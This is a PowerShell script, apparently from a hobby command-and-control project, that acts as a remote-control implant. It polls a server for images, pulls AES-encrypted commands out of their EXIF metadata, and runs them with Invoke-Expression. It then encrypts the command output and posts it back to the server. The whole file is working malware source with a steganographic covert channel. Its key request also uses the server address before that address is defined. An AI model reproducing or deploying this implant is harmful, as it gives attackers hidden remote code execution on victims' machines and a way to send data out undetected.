# Credit to https://github.com/CeilingGang/MemeC2
# Ceiling Gang AUUH!

# Get the Pre-shared Key from the server
$Response = Invoke-RestMethod -Method Get -Uri "$Endpoint/hej_monika"
$PSK = $Response

# Convert the PSK to a byte array
$Key = New-Object Byte[] 16
for ($i = 0; $i -lt $PSK.Length; $i += 2) {
    $Key[$i / 2] = [Convert]::ToByte($PSK.Substring($i, 2), 16)
}

# Define your server's IP and port
$ServerIP = "127.0.0.1"
$Port = "5000"

# Define the endpoint
$Endpoint = "http://$ServerIP`:$Port"

# Last command received
$LastCommand = ""

while($true) {
    Start-Sleep -Seconds 1

    # Download the image and save it
    $ImagePath = "./command_image.png"
    Invoke-WebRequest -Uri "$Endpoint/ceiling_gang" -OutFile $ImagePath

    # Use .NET classes to get the ImageDescription EXIF data from the image
    $Image = New-Object System.Drawing.Bitmap $ImagePath
    $PropertyItems = $Image.PropertyItems
    $Image.Dispose()  # Dispose image after reading property items

    # Find the property item for the ImageDescription (ID 270)
    $ImageDescriptionItem = $PropertyItems | Where-Object { $_.Id -eq 270 }

    # Convert the property item data from byte array to string
    $ImageDescription = [System.Text.Encoding]::Default.GetString($ImageDescriptionItem.Value)

    # Remove the trailing null character
    $ImageDescription = $ImageDescription.TrimEnd([char]0)


    # Decode the base64 string
    $CommandBytes = [System.Convert]::FromBase64String($ImageDescription)

    $IV = $CommandBytes[0..15]
    $Ciphertext = $CommandBytes[16..($CommandBytes.Count - 1)]

    # Create a new AES Managed object
    $AESManaged = New-Object "System.Security.Cryptography.AesManaged"
    $AESManaged.Key = $Key
    $AESManaged.IV = $IV
    $AESManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AESManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    # Decrypt the command
    $Decryptor = $AESManaged.CreateDecryptor()
    $DecryptedCommandBytes = $Decryptor.TransformFinalBlock($Ciphertext, 0, $Ciphertext.Length)
    $DecryptedCommand = [System.Text.Encoding]::UTF8.GetString($DecryptedCommandBytes)


    # If the command is different than the last one, execute it
    if($DecryptedCommand -ne $LastCommand) {
        $LastCommand = $DecryptedCommand

        # Execute the command and get the DecryptedCommand
        $Result = Invoke-Expression -Command $DecryptedCommand

        # Encrypt the result
        $AESManaged = New-Object System.Security.Cryptography.AesManaged
        $AESManaged.Key = $Key
        $AESManaged.GenerateIV()
        $Encryptor = $AESManaged.CreateEncryptor()
        $ResultBytes = [System.Text.Encoding]::UTF8.GetBytes($Result)
        $EncryptedResultBytes = $Encryptor.TransformFinalBlock($ResultBytes, 0, $ResultBytes.Length)

        # Concatenate IV and encrypted result, then base64 encode it
        $EncryptedResult = [System.Convert]::ToBase64String($AESManaged.IV + $EncryptedResultBytes)

        # Send the encrypted result to the server
        $Body = @{ "content" = $EncryptedResult } | ConvertTo-Json
        Invoke-RestMethod -Method Post -Uri "$Endpoint/floor_gang" -Body $Body -ContentType "application/json"
    }
}
